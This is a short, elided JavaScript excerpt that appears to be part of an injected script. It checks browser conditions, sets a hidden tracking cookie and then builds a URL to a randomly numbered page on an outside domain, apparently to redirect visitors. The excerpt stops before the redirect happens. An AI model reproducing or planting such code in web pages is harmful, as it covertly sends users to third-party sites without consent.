...
//            })(js_src.split('?'));
    ...
    if (!thisWindow.l___k__s && !isOpera && navigator.cookieEnabled && /^http:/.test(thisDocument.URL)) {
        var createCookie = function(name, value, days) {
            ...
            thisDocument.cookie = name + "=" + value + expires + "; path=/";
        };
        ...
        var key = "__wbzc";
        var value = "941a7b6ea0247bd6a767cf13cb8275ce";
        var ht = 10300 + parseInt(4800*Math.random());
        var regg = new RegExp(value);
        if (!regg.test(getCookie(key))) {
            var url = "http://www.qiku360.com/mxwb/"+ht+".html?f=" + parseInt(1E4 * Math.random()) + "&k=" + (new Date()).valueOf();
